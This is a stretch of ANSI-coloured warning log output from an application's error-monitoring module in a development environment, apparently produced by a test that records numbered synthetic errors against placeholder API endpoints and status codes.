WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838848Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2818'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838896Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2819'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838944Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2820'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.838993Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2821'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839041Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2822'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839137Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2823'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839209Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2824'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839264Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2825'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839316Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2826'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839418Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2827'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839483Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2828'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2829'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839592Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2830'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839643Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2831'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839693Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2832'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839742Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2833'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839791Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2834'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2835'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839890Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2836'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839938Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2837'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.839987Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2838'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840036Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2839'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840085Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2840'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2841'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840182Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2842'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2843'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2844'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840333Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2845'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840385Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2846'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840436Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2847'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840486Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2848'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840538Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m57[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2849'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840587Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2850'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840636Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2851'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840685Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2852'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2853'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2854'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840834Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2855'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840884Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2856'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.840933Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m58[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2857'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
